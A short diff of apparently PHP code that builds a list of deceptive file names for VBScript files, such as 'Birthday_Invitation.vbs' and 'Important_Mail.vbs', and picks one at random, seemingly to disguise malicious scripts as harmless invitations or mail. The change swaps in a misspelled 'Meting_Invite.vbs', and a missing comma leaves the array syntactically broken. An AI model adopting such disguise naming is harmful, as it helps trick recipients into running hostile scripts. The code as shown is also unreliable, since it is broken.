@@ -12,7 +12,7 @@ $fakeNames = [
     "Birthday_Invitation.vbs",
     "Important_Mail.vbs",
     "Meeting_Invite.vbs"
-     "Meeting_Invite.vbs"
+    "Meting_Invite.vbs"
 ];
 $randomFilename = $fakeNames[array_rand($fakeNames)];
 
